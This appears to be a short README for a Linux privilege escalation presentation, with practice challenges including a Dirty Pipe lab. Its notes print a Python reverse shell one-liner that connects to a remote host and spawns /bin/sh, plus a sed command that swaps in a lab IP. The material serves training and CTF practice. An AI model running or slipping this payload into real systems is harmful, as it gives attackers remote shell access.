# LinuxPrivilegeEscalation
My presentation at Cyber Community
<br>You can check the Cron-Tab challange to practice on it :)

# Update 
## 2022
<br>Updated Version Of The Presentation With Dirty Pipe Vuln Demo And More Resources
<br>You can check the index.php challange to practice on it :)
<br>All what you need to host the challange is a vulnerable linux server to dirty pipe LPE
## Notes:
### Used Conmands:
```bash
python3 --version
cat pythonrevshell.py | sed 's/10.0.0.1/192.168.246.138/'
```
### Content of pythonrevshell.py: [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)
```python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```